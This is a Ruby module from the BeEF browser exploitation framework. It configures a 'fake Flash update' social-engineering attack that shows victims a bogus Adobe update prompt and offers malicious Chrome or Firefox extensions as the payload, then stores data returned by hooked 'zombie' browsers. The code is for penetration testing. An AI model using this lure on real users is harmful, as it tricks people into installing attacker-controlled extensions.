#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_flash_update < BeEF::Core::Command
  
  def self.options
    configuration = BeEF::Core::Configuration.instance
    payload_root = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}"
    image = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/adobe_flash_update.png"

    return [
        {'name' =>'image', 'description' =>'Location of image for the update prompt', 'ui_label'=>'Splash image', 'value' => image},
        {'name' =>'payload_root', 'description' =>'BeEF (Payload) root path', 'ui_label'=>'BeEF (Payload) root path', 'value' => payload_root},
        {'name' =>'chrome_store_uri', 'description' =>'Chrome WebStore Extension URI', 'ui_label'=>'Chrome WebStore Extension URI', 'value' => ""},
        { 'name' => 'payload', 'type' => 'combobox', 'ui_label' => 'Payload', 'store_type' => 'arraystore',
          'store_fields' => ['payload'], 'store_data' => [['Chrome_Extension'],['Firefox_Extension']],
          'valueField' => 'payload', 'displayField' => 'payload', 'mode' => 'local', 'autoWidth' => true
        }
    ]
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({'answer' => @datastore['answer']})
  end
  
end
